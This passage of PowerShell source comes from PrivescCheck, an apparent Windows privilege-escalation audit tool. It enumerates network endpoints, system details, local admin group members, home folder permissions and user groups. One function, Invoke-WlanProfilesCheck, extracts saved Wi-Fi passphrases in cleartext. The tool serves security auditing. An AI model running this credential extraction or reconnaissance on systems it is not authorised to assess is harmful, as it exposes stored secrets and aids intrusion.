        Write-Verbose "Excluding port range: $($RpcRange.MinPort)-$($RpcRange.MaxPort)"
    
        $Endpoints | ForEach-Object {

            if (-not ($IgnoredPorts -contains $_.LocalPort)) {

                if ($RpcRange) {

                    if (($_.LocalPort -lt $RpcRange.MinPort) -or ($_.LocalPort -ge $RpcRange.MaxPort)) {
                        
                        $FilteredEndpoints += $_
                    }
                }
            }
        }
        $Endpoints = $FilteredEndpoints
    } 

    $Endpoints | ForEach-Object {
        $TcpEndpoint = New-Object -TypeName PSObject
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "State" -Value $_.State
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $_.PID
        $TcpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $_.Name
        $TcpEndpoint
    }
}

function Invoke-UdpEndpointsCheck {
    <#
    .SYNOPSIS

    Enumerates all UDP endpoints on the local machine (IPv4 and IPv6)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the custom "Get-NetworkEndpoints" function to enumerate all the UDP endpoints on the
    local machine, IPv4 and IPv6. The list can be filtered based on a list of known ports.
    
    .PARAMETER Filtered

    Use this switch to filter out the list of endpoints returned by this function. The filter 
    excludes all the standard ports such as 139 or 500.
    
    .EXAMPLE

    PS C:\> Invoke-UdpEndpointsCheck | ft

    IP   Proto LocalAddress                       State  PID Name
    --   ----- ------------                       -----  --- ----
    IPv4 UDP   0.0.0.0:5050                       N/A   5408 svchost
    IPv4 UDP   0.0.0.0:5353                       N/A   2176 svchost
    IPv4 UDP   0.0.0.0:5355                       N/A   2176 svchost
    IPv4 UDP   0.0.0.0:54565                      N/A   3100 SkypeApp
    IPv4 UDP   127.0.0.1:1900                     N/A   5088 svchost
    IPv4 UDP   127.0.0.1:51008                    N/A   5088 svchost
    IPv4 UDP   127.0.0.1:60407                    N/A   3052 svchost
    IPv4 UDP   192.168.74.136:137                 N/A      4 System
    IPv4 UDP   192.168.74.136:138                 N/A      4 System
    IPv4 UDP   192.168.74.136:1900                N/A   5088 svchost
    IPv4 UDP   192.168.74.136:51007               N/A   5088 svchost
    IPv6 UDP   [::]:5353                          N/A   2176 svchost
    IPv6 UDP   [::]:5355                          N/A   2176 svchost
    IPv6 UDP   [::]:54565                         N/A   3100 SkypeApp
    IPv6 UDP   [::1]:1900                         N/A   5088 svchost
    IPv6 UDP   [::1]:51006                        N/A   5088 svchost
    IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:1900  N/A   5088 svchost
    IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:51005 N/A   5088 svchost
    
    #>
    
    [CmdletBinding()]Param(
        [switch]$Filtered
    )

    # https://support.microsoft.com/en-us/help/832017/service-overview-and-network-port-requirements-for-windows
    $IgnoredPorts = @(53, 67, 123, 137, 138, 139, 500, 1701, 2535, 4500, 445, 1900, 5050, 5353, 5355)
    
    $Endpoints = Get-NetworkEndpoints -UDP 
    $Endpoints += Get-NetworkEndpoints -UDP -IPv6

    if ($Filtered) {
        $FilteredEndpoints = @()
        $Endpoints | ForEach-Object {
            if (-not ($IgnoredPorts -contains $_.LocalPort)) {
                $FilteredEndpoints += $_
            }
        }
        $Endpoints = $FilteredEndpoints
    }

    $Endpoints | ForEach-Object {
        if (-not ($_.Name -eq "dns")) {
            $UdpEndpoint = New-Object -TypeName PSObject 
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $_.IP
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $_.Proto
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $_.Endpoint
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "State" -Value $_.State
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $_.PID
            $UdpEndpoint | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $_.Name
            $UdpEndpoint
        }
    }
}

function Invoke-WlanProfilesCheck {
    <#
    .SYNOPSIS

    Enumerates the saved Wifi profiles and extract the cleartext key/passphrase when applicable

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The built-in "netsh" command allows one to list the saved Wifi profiles and extract the cleartext
    key or passphrase when applicable (e.g.: "netsh wlan show profile MyWifiProfile key=clear"). This
    function achieves the same goal. It iterates the list of Wlan interfaces in order to enumerate
    all the Wifi profiles which can be accessed in the context of the current user. If a network is 
    configured with WEP or PSK authentication, it will attempt to extract the cleartext value of the
    key or passphrase. 
    
    .EXAMPLE
    
    PS C:\> Invoke-WlanProfilesCheck

    Profile        : MySecretAccessPoint
    SSID           : MySecretAccessPoint
    Authentication : WPA2PSK
    PassPhrase     : AvErYsEcReTpAsSpHrAsE
    Interface      : Compact Wireless-G USB Network Adapter
    
    #>

    [CmdletBinding()] param()

    function Convert-ProfileXmlToObject {

        [CmdletBinding()] param(
            [string]$ProfileXml
        )

        $Xml = [xml] $ProfileXml

        $Name = $Xml.WLANProfile.name
        $Ssid = $Xml.WLANProfile.SSIDConfig.SSID.name 
        $Authentication = $Xml.WLANProfile.MSM.security.authEncryption.authentication
        $PassPhrase = $Xml.WLANProfile.MSM.security.sharedKey.keyMaterial

        $Profile = New-Object -TypeName PSObject
        $Profile | Add-Member -MemberType "NoteProperty" -Name "Profile" -Value $Name
        $Profile | Add-Member -MemberType "NoteProperty" -Name "SSID" -Value $Ssid
        $Profile | Add-Member -MemberType "NoteProperty" -Name "Authentication" -Value $Authentication
        $Profile | Add-Member -MemberType "NoteProperty" -Name "PassPhrase" -Value $PassPhrase
        $Profile
    }

    $ERROR_SUCCESS = 0

    try {
        [IntPtr]$ClientHandle = [IntPtr]::Zero
        $NegotiatedVersion = 0
        $Result = [PrivescCheck.Win32]::WlanOpenHandle(2, [IntPtr]::Zero, [ref]$NegotiatedVersion, [ref]$ClientHandle)
        if ($Result -eq $ERROR_SUCCESS) {
    
            Write-Verbose "WlanOpenHandle() OK - Handle: $($ClientHandle)"
    
            [IntPtr]$InterfaceListPtr = [IntPtr]::Zero
            $Result = [PrivescCheck.Win32]::WlanEnumInterfaces($ClientHandle, [IntPtr]::Zero, [ref]$InterfaceListPtr)
            if ($Result -eq $ERROR_SUCCESS) {
    
                Write-Verbose "WlanEnumInterfaces() OK - Interface list pointer: 0x$($InterfaceListPtr.ToString('X8'))"
    
                $NumberOfInterfaces = [Runtime.InteropServices.Marshal]::ReadInt32($InterfaceListPtr)
                Write-Verbose "Number of Wlan interfaces: $($NumberOfInterfaces)"
    
                # Calculate the pointer to the first WLAN_INTERFACE_INFO structure 
                $WlanInterfaceInfoPtr = [IntPtr] ($InterfaceListPtr.ToInt64() + 8) # dwNumberOfItems + dwIndex
    
                for ($i = 0; $i -lt $NumberOfInterfaces; $i++) {
    
                    $WlanInterfaceInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WlanInterfaceInfoPtr, [type] [PrivescCheck.Win32+WLAN_INTERFACE_INFO])
    
                    Write-Verbose "Wlan interface: $($WlanInterfaceInfo.strInterfaceDescription)"
    
                    [IntPtr]$ProfileListPtr = [IntPtr]::Zero
                    $Result = [PrivescCheck.Win32]::WlanGetProfileList($ClientHandle, $WlanInterfaceInfo.InterfaceGuid, [IntPtr]::Zero, [ref]$ProfileListPtr)
                    if ($Result -eq $ERROR_SUCCESS) {
    
                        Write-Verbose "WlanGetProfileList() OK - Profile list pointer: 0x$($ProfileListPtr.ToString('X8'))"
    
                        $NumberOfProfiles = [Runtime.InteropServices.Marshal]::ReadInt32($ProfileListPtr)
                        Write-Verbose "Number of profiles: $($NumberOfProfiles)"
    
                        # Calculate the pointer to the first WLAN_PROFILE_INFO structure 
                        $WlanProfileInfoPtr = [IntPtr] ($ProfileListPtr.ToInt64() + 8) # dwNumberOfItems + dwIndex
    
                        for ($j = 0; $j -lt $NumberOfProfiles; $j++) {
    
                            $WlanProfileInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WlanProfileInfoPtr, [type] [PrivescCheck.Win32+WLAN_PROFILE_INFO])
    
                            Write-Verbose "Wlan profile: $($WlanProfileInfo.strProfileName)"
    
                            [string]$ProfileXml = ""
                            [UInt32]$WlanProfileFlags = 4 # WLAN_PROFILE_GET_PLAINTEXT_KEY
                            [UInt32]$WlanProfileAccessFlags = 0
                            $Result = [PrivescCheck.Win32]::WlanGetProfile($ClientHandle, $WlanInterfaceInfo.InterfaceGuid, $WlanProfileInfo.strProfileName, [IntPtr]::Zero, [ref]$ProfileXml, [ref]$WlanProfileFlags, [ref]$WlanProfileAccessFlags)
                            if ($Result -eq $ERROR_SUCCESS) {
    
                                Write-Verbose "WlanGetProfile() OK"
    
                                $Item = Convert-ProfileXmlToObject -ProfileXml $ProfileXml
                                $Item | Add-Member -MemberType "NoteProperty" -Name "Interface" -Value $WlanInterfaceInfo.strInterfaceDescription
                                $Item
    
                            } else {
                                Write-Verbose "WlanGetProfile() failed (Err: $($Result))"
                            }
    
                            # Calculate the pointer to the next WLAN_PROFILE_INFO structure 
                            $WlanProfileInfoPtr = [IntPtr] ($WlanProfileInfoPtr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($WlanProfileInfo))
                        }
    
                        # cleanup
                        [PrivescCheck.Win32]::WlanFreeMemory($ProfileListPtr)
    
                    } else {
                        Write-Verbose "WlanGetProfileList() failed (Err: $($Result))"
                    }
    
                    # Calculate the pointer to the next WLAN_INTERFACE_INFO structure 
                    $WlanInterfaceInfoPtr = [IntPtr] ($WlanInterfaceInfoPtr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($WlanInterfaceInfo))
                }
    
                # cleanup
                [PrivescCheck.Win32]::WlanFreeMemory($InterfaceListPtr)
    
            } else {
                Write-Verbose "WlanEnumInterfaces() failed (Err: $($Result))"
            }
    
            # cleanup
            $Result = [PrivescCheck.Win32]::WlanCloseHandle($ClientHandle, [IntPtr]::Zero)
            if ($Result -eq $ERROR_SUCCESS) {
                Write-Verbose "WlanCloseHandle() OK"
            } else {
                Write-Verbose "WlanCloseHandle() failed (Err: $($Result))"
            }
    
        } else {
            Write-Verbose "WlanOpenHandle() failed (Err: $($Result))"
        }
    } catch {
        # Do nothing
        # Wlan API doesn't exist on this machine probably 
    }
}
# ----------------------------------------------------------------
# END NETWORK    
# ----------------------------------------------------------------

# ----------------------------------------------------------------
# BEGIN MISC   
# ----------------------------------------------------------------
function Invoke-SystemInfoCheck {
    <#
    .SYNOPSIS

    Gets the name of the operating system and the full version string.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Reads the "Product Name" from the registry and gets the full version string based on the 
    operating system.
    
    .EXAMPLE

    Invoke-SystemInfoCheck | fl

    Name    : Windows 10 Home
    Version : 10.0.18363 Version 1909 (18363.535)
    
    .LINK

    https://techthoughts.info/windows-version-numbers/

    #>
    
    [CmdletBinding()] param()

    $OsName = ""
    $OsVersion = [System.Environment]::OSVersion.Version

    $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    if (-not $GetItemPropertyError) {

        $OsName = $Item.ProductName

        if ($OsVersion -like "10.*") {
            # Windows >= 10/2016
            $OsVersion = "$($Item.CurrentMajorVersionNumber).$($Item.CurrentMinorVersionNumber).$($Item.CurrentBuild) Version $($Item.ReleaseId) ($($Item.CurrentBuild).$($Item.UBR))"
        } 

        $SystemInfoResult = New-Object -TypeName PSObject
        $SystemInfoResult | Add-Member -MemberType NoteProperty -Name "Name" -Value $OsName
        $SystemInfoResult | Add-Member -MemberType NoteProperty -Name "Version" -Value $OsVersion
        $SystemInfoResult

    } else {
        Write-Verbose $GetItemPropertyError
    }
}

function Invoke-SystemStartupHistoryCheck {
    <#
    .SYNOPSIS

    Gets a list of all the system startup events which occurred in the given time span.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the Event Log to get a list of all the events that indicate a system startup. The start
    event of the Event Log service is used as a reference.
    
    .PARAMETER TimeSpanInDays

    An optional parameter indicating the time span to check in days. e.g.: check the last 31 days.
    
    .EXAMPLE

    PS C:\> Invoke-SystemStartupHistoryCheck

    Index Time
    ----- ----
         1 2020-01-11 - 21:36:59
         2 2020-01-08 - 08:45:01
         3 2020-01-07 - 11:45:43
         4 2020-01-06 - 14:43:41
         5 2020-01-05 - 23:07:41
         6 2020-01-05 - 11:41:39
         7 2020-01-04 - 14:18:46
         8 2020-01-04 - 14:18:10
         9 2020-01-04 - 12:51:51
        10 2020-01-03 - 10:41:15
        11 2019-12-27 - 13:57:30
        12 2019-12-26 - 10:56:38
        13 2019-12-25 - 12:12:14
        14 2019-12-24 - 17:41:04
    
    .NOTES

    Event ID 6005: The Event log service was started, i.e. system startup theoretically.

    #>
    
    [CmdletBinding()] param(
        [int]
        $TimeSpanInDays = 31
    )

    try {
        $SystemStartupHistoryResult = New-Object -TypeName System.Collections.ArrayList

        $StartDate = (Get-Date).AddDays(-$TimeSpanInDays)
        $EndDate = Get-Date

        $StartupEvents = Get-EventLog -LogName "System" -EntryType "Information" -After $StartDate -Before $EndDate | Where-Object {$_.EventID -eq 6005}

        $EventNumber = 1

        ForEach ($Event in $StartupEvents) {
            $SystemStartupHistoryItem = New-Object -TypeName PSObject 
            $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Index" -Value $EventNumber
            $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $Event.TimeGenerated)"
            #$SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Message" -Value "$($Event.Message)"
            [void]$SystemStartupHistoryResult.Add($SystemStartupHistoryItem)
            $EventNumber += 1
        }

        $SystemStartupHistoryResult
    } catch {
        # We might get an "acces denied"
        Write-Verbose "Error while querying the Event Log."
    }
}

function Invoke-SystemStartupCheck {
    <#
    .SYNOPSIS
    
    Gets the last system startup time
    
    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Gets the tickcount in milliseconds thanks to the GetTickCount64 Win32 function and substracts
    the value to the current date. This yields the date and time of the last system startup. The 
    result is returned in a custom PS Object containing a string representation of the DateTime
    object. 
    
    .EXAMPLE

    PS C:\> Invoke-SystemStartupCheck

    Time
    ----
    2020-01-11 - 21:36:41

    .NOTES

    [Environment]::TickCount is a 32-bit signed integer
    The max value it can hold is 49.7 days. That's why GetTickCount64() is used instead.
    
    #>
    
    [CmdletBinding()] param() 

    try {
        $TickcountMilliseconds = [PrivescCheck.Win32]::GetTickCount64()

        $StartupDate = (Get-Date).AddMilliseconds(-$TickcountMilliseconds)

        $SystemStartupResult = New-Object -TypeName PSObject
        $SystemStartupResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $StartupDate)"
        $SystemStartupResult
    
    } catch {
        # We are dealing with the Windows API so let's silently catch any exception, just in case...
    }
}

function Invoke-SystemDrivesCheck {
    <#
    .SYNOPSIS

    Gets a list of local drives and network shares that are currently mapped

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This function is a wrapper for the "Get-PSDrive" standard cmdlet. For each result returned by 
    "Get-PSDrive", a custom PS object is returned, indicating the drive letter (if applicable), the
    display name (if applicable) and the description.
    
    .EXAMPLE

    PS C:\> Invoke-SystemDrivesCheck 

    Root DisplayRoot Description
    ---- ----------- -----------
    C:\              OS
    E:\              DATA
    #>
    
    [CmdletBinding()] param()

    $SystemDrivesResult = New-Object -TypeName System.Collections.ArrayList

    $Drives = Get-PSDrive -PSProvider "FileSystem"

    ForEach ($Drive in $Drives) {
        $DriveItem = New-Object -TypeName PSObject
        $DriveItem | Add-Member -MemberType "NoteProperty" -Name "Root" -Value "$($Drive.Root)"
        $DriveItem | Add-Member -MemberType "NoteProperty" -Name "DisplayRoot" -Value "$($Drive.DisplayRoot)"
        $DriveItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "$($Drive.Description)"
        [void]$SystemDrivesResult.Add([object]$DriveItem)
    }

    $SystemDrivesResult
}

function Invoke-LocalAdminGroupCheck {
    <#
    .SYNOPSIS

    Enumerates the members of the default local admin group

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    For every member of the local admin group, it will check whether it's a local/domain user/group.
    If it's local it will also check if the account is enabled. 
    
    .EXAMPLE

    PS C:\> Invoke-LocalAdminGroupCheck

    Name          Type IsLocal IsEnabled
    ----          ---- ------- ---------
    Administrator User    True     False
    lab-admin     User    True      True
    
    .NOTES

    S-1-5-32-544 = SID of the local admin group 

    #>

    [CmdletBinding()] param()

    function Get-UserFlags {
        param(
            $UserFlags
        )

        $UserFlagsEnum = @{
            "ADS_UF_SCRIPT" = "1";
            "ADS_UF_ACCOUNTDISABLE" = "2";
            "ADS_UF_HOMEDIR_REQUIRED" = "8";
            "ADS_UF_LOCKOUT" = "16";
            "ADS_UF_PASSWD_NOTREQD" = "32";
            "ADS_UF_PASSWD_CANT_CHANGE" = "64";
            "ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED" = "128";
            "ADS_UF_TEMP_DUPLICATE_ACCOUNT" = "256";
            "ADS_UF_NORMAL_ACCOUNT" = "512";
            "ADS_UF_INTERDOMAIN_TRUST_ACCOUNT" = "2048";
            "ADS_UF_WORKSTATION_TRUST_ACCOUNT" = "4096";
            "ADS_UF_SERVER_TRUST_ACCOUNT" = "8192";
            "ADS_UF_DONT_EXPIRE_PASSWD" = "65536";
            "ADS_UF_MNS_LOGON_ACCOUNT" = "131072";
            "ADS_UF_SMARTCARD_REQUIRED" = "262144";
            "ADS_UF_TRUSTED_FOR_DELEGATION" = "524288";
            "ADS_UF_NOT_DELEGATED" = "1048576";
            "ADS_UF_USE_DES_KEY_ONLY" = "2097152";
            "ADS_UF_DONT_REQUIRE_PREAUTH" = "4194304";
            "ADS_UF_PASSWORD_EXPIRED" = "8388608";
            "ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION" = "16777216";
        }

        $UserFlagsEnum.GetEnumerator() | ForEach-Object { 
            if ( $_.value -band $UserFlags ) 
            {
                $_.name
            }
        }
    }

    function Get-GroupFlags {
        param(
            $GroupFlags
        )
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/11972272-09ec-4a42-bf5e-3e99b321cf55
        $GroupFlagsEnum = @{
            "ADS_GROUP_TYPE_BUILTIN_LOCAL_GROUP" = "1"; # Specifies a group that is created by the system.
            "ADS_GROUP_TYPE_ACCOUNT_GROUP" = "2"; # Specifies a global group.
            "ADS_GROUP_TYPE_RESOURCE_GROUP" = "4"; # Specifies a domain local group.
            "ADS_GROUP_TYPE_UNIVERSAL_GROUP" = "8"; # Specifies a universal group.
            "ADS_GROUP_TYPE_APP_BASIC_GROUP" = "16";
            "ADS_GROUP_TYPE_APP_QUERY_GROUP" = "32";
            "ADS_GROUP_TYPE_SECURITY_ENABLED" = "2147483648"; # Specifies a security-enabled group.
        }

        $GroupFlagsEnum.GetEnumerator() | ForEach-Object { 
            if ($_.value -band $GroupFlags) 
            {
                $_.name
            }
        }
    }

    $LocalAdminGroupSid = "S-1-5-32-544" # Local admin group SID 
    $LocalAdminGroupFullname = ([Security.Principal.SecurityIdentifier]$LocalAdminGroupSid).Translate([Security.Principal.NTAccount]).Value
    $LocalAdminGroupName = $LocalAdminGroupFullname.Split('\')[1]

    $Computer = $env:COMPUTERNAME
    $AdsiComputer = [ADSI]("WinNT://$Computer,computer") 

    try {
        $LocalAdminGroup = $AdsiComputer.psbase.children.find($LocalAdminGroupName, "Group") 

        if ($LocalAdminGroup) {
            $LocalAdminGroup.psbase.invoke("members") | ForEach-Object {
                # For each member of the local admin group 
                
                $MemberName = $_.GetType().InvokeMember("Name",  'GetProperty',  $null,  $_, $null)
                $Member = $Null

                # Is it a local user?
                $AdsiComputer.Children | Where-Object { $_.SchemaClassName -eq "User" } | ForEach-Object {
                    if ($_.Name -eq $MemberName) {
                        Write-Verbose "Found user: $MemberName"
                        $Member = $_
                    } 
                }

                # if it's not a local user, is it a local grop ?
                if (-not $IsLocal) {
                    $AdsiComputer.Children | Where-Object { $_.SchemaClassName -eq "Group" } | ForEach-Object {
                        if ($_.Name -eq $MemberName) {
                            Write-Verbose "Found group: $MemberName"
                            $Member = $_
                        }
                    }
                }

                if ($Member) {
                    if ($Member.SchemaClassName -eq "User") {
                        $UserFlags = $Member.UserFlags.value
                        $Flags = Get-UserFlags $UserFlags 
                        $MemberType = "User"
                        $MemberIsLocal = $True
                        $MemberIsEnabled = $(-not ($Flags -contains "ADS_UF_ACCOUNTDISABLE"))
                    } elseif ($Member.SchemaClassName -eq "Group") {
                        $GroupType = $Member.groupType.value
                        $Flags = Get-GroupFlags $GroupType
                        $MemberType = "Group"
                        $MemberIsLocal = $($Flags -contains "ADS_GROUP_TYPE_RESOURCE_GROUP")
                        $MemberIsEnabled = $True 
                    }
                } else {
                    $MemberType = ""
                    $MemberIsLocal = $False
                    $MemberIsEnabled = $Null 
                }

                $LocalAdminGroupResultItem = New-Object -TypeName PSObject 
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $MemberName
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $MemberType
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsLocal" -Value $MemberIsLocal  
                $LocalAdminGroupResultItem | Add-Member -MemberType "NoteProperty" -Name "IsEnabled" -Value $MemberIsEnabled 
                $LocalAdminGroupResultItem
            }
        } 
    } catch {
        Write-Verbose $_.Exception
    }
}

function Invoke-UsersHomeFolderCheck {
    <#
    .SYNOPSIS
    
    Enumerates the local user home folders.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Enumerates the folders located in C:\Users\. For each one, this function checks whether the 
    folder is readable and/or writable by the current user. 
    
    .EXAMPLE

    PS C:\> Invoke-UsersHomeFolderCheck

    HomeFolderPath         Read Write
    --------------         ---- -----
    C:\Users\Lab-Admin    False False
    C:\Users\Lab-User      True  True
    C:\Users\Public        True  True
    
    #>

    [CmdletBinding()] param()
    
    $UsersHomeFolder = Join-Path -Path $((Get-Item $env:windir).Root) -ChildPath Users

    Get-ChildItem -Path $UsersHomeFolder | ForEach-Object {

        $FolderPath = $_.FullName
        $ReadAccess = $False
        $WriteAccess = $False

        $Null = Get-ChildItem -Path $FolderPath -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem 
        if (-not $ErrorGetChildItem) {

            $ReadAccess = $True 

            $ModifiablePaths = $FolderPath | Get-ModifiablePath -LiteralPaths
            if (([object[]]$ModifiablePaths).Length -gt 0) {
                $WriteAccess = $True
            }
        }

        $UserHomFolderResultItem = New-Object -TypeName PSObject 
        $UserHomFolderResultItem | Add-Member -MemberType "NoteProperty" -Name "HomeFolderPath" -Value $FolderPath
        $UserHomFolderResultItem | Add-Member -MemberType "NoteProperty" -Name "Read" -Value $ReadAccess
        $UserHomFolderResultItem | Add-Member -MemberType "NoteProperty" -Name "Write" -Value $WriteAccess
        $UserHomFolderResultItem
    }
}

function Invoke-MachineRoleCheck {
    <#
    .SYNOPSIS

    Gets the role of the machine (workstation, server, domain controller)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The role of the machine can be checked by reading the following registry key:
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
    The "ProductType" value represents the role of the machine.
    
    .EXAMPLE

    PS C:\> Invoke-MachineRoleCheck

    Name  Role       
    ----  ----       
    WinNT WorkStation
    
    .NOTES

    WinNT = workstation
    LanmanNT = domain controller
    ServerNT = server

    #>
    
    [CmdletBinding()] param()

    $MachineRoleResult = New-Object -TypeName PSObject 

    $Item = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    
    $FriendlyNames = @{
        "WinNT" = "WorkStation";
        "LanmanNT" = "Domain Controller";
        "ServerNT" = "Server";
    }

    if (-not $GetItemPropertyError){
        try {
            $MachineRoleResult = New-Object -TypeName PSObject
            $MachineRoleResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Item.ProductType
            $MachineRoleResult | Add-Member -MemberType "NoteProperty" -Name "Role" -Value $FriendlyNames[$Item.ProductType]
            $MachineRoleResult 
        } catch {
            Write-Verbose "Hashtable error."
        }
    }
}

function Invoke-WindowsUpdateCheck {
    <#
    .SYNOPSIS

    Gets the last update time of the machine.

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The Windows Update status can be queried thanks to the Microsoft.Update.AutoUpdate COM object.
    It gives the last successful search time and the last successfull update installation time.
    
    .EXAMPLE

    PS C:\> Invoke-WindowsUpdateCheck

    Time
    ----
    2020-01-12 - 09:17:37

    #>
    
    [CmdletBinding()] param()

    try {
        $WindowsUpdate = (New-Object -ComObject "Microsoft.Update.AutoUpdate").Results

        if ($WindowsUpdate.LastInstallationSuccessDate) {
            $WindowsUpdateResult = New-Object -TypeName PSObject 
            $WindowsUpdateResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value $(Convert-DateToString -Date $WindowsUpdate.LastInstallationSuccessDate)
            $WindowsUpdateResult
        } 
    } catch {
        # We migh get an access denied when querying this COM object
        Write-Verbose "Error while requesting COM object Microsoft.Update.AutoUpdate."
    }
}

# ----------------------------------------------------------------
# END MISC   
# ----------------------------------------------------------------


# ----------------------------------------------------------------
# BEGIN CURRENT USER   
# ----------------------------------------------------------------
function Invoke-UserCheck {
    <#
    .SYNOPSIS

    Gets the usernane and SID of the current user

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Gets the usernane and SID of the current user
    
    .EXAMPLE

    PS C:\> Invoke-UserCheck

    Name                     SID
    ----                     ---
    DESKTOP-FEOHNOM\lab-user S-1-5-21-1448366976-598358009-3880595148-1002

    #>
    
    [CmdletBinding()] param()
    
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

    $UserResult = New-Object -TypeName PSObject 
    $UserResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $CurrentUser.Name 
    $UserResult | Add-Member -MemberType "NoteProperty" -Name "SID" -Value $CurrentUser.User 
    $UserResult
}

function Invoke-UserGroupsCheck {
    <#
    .SYNOPSIS

    Enumerates groups the current user belongs to except default and low-privileged ones

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    For each group the current user belongs to, a custom object is returned, indicating the name
    and the SID of the group.
    
    .EXAMPLE

    PS C:\> Invoke-UserGroupsCheck

    Name                            SID                                         
    ----                            ---                                         
    BUILTIN\Remote Management Users S-1-5-32-580 

    .LINK

    https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
    #>
    
    [CmdletBinding()] param()

    $IgnoredGroupSids = @(
        "S-1-0",            # Null Authority
        "S-1-0-0",          # Nobody
        "S-1-1",            # World Authority
        "S-1-1-0",          # Everyone
        "S-1-2",            # Local Authority
        "S-1-2-0",          # Local
        "S-1-2-1",          # CONSOLE_LOGON
        "S-1-3",            # Creator Authority
        "S-1-3-0",          # Creator Owner
        "S-1-3-1",          # Creator Group
        "S-1-3-2",          # OWNER_SERVER
        "S-1-3-3",          # GROUP_SERVER
        "S-1-3-4",          # Owner Rights
        "S-1-5-80-0",       # NT Services\All Services
        "S-1-5",            # NT Authority
        "S-1-5-1",          # Dialup
        "S-1-5-2",          # Network
        "S-1-5-3",          # Batch
        "S-1-5-4",          # Interactive
        "S-1-5-6",          # Service
        "S-1-5-7",          # Anonymous
        "S-1-5-8",          # PROXY
        "S-1-5-10",         # Principal Self
        "S-1-5-11",         # Authenticated Users
        "S-1-5-12",         # Restricted Code
        "S-1-5-15",         # THIS_ORGANIZATION
        "S-1-5-17",         # This Organization
        "S-1-5-18",         # Local System 
        "S-1-5-19",         # Local Service
        "S-1-5-20",         # Network Service
        "S-1-5-32-545",     # Users
        "S-1-5-32-546",     # Guests
        "S-1-5-32-554",     # Builtin\Pre-Windows 2000 Compatible Access
        "S-1-5-80-0",       # NT Services\All Services
        "S-1-5-83-0",       # NT Virtual Machine\Virtual Machines
        "S-1-5-113",        # LOCAL_ACCOUNT
        "S-1-5-1000",       # OTHER_ORGANIZATION
        "S-1-15-2-1"        # ALL_APP_PACKAGES
    ) 

    $IgnoredGroupSidPatterns = @(
        "S-1-5-21-*-513",   # Domain Users
        "S-1-5-21-*-514",   # Domain Guests
        "S-1-5-21-*-515",   # Domain Computers
        "S-1-5-21-*-516",   # Domain Controllers
        "S-1-5-21-*-545",   # Users
        "S-1-5-21-*-546",   # Guests
        "S-1-5-64-*",       # NTLM / SChannel / Digest Authentication
        "S-1-16-*",         # Integrity levels 
        "S-1-15-3-*",       # Capabilities ("Active Directory does not resolve capability SIDs to names. This behavior is by design.")
        "S-1-18-*"          # Identities
    )
    
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $Groups = $CurrentUser.Groups 

    ForEach ($Group in $Groups) {

        $GroupSid = $Group.Value 

        if (-not ($IgnoredGroupSids -contains $GroupSid)) {

            $KnownSid = $False 
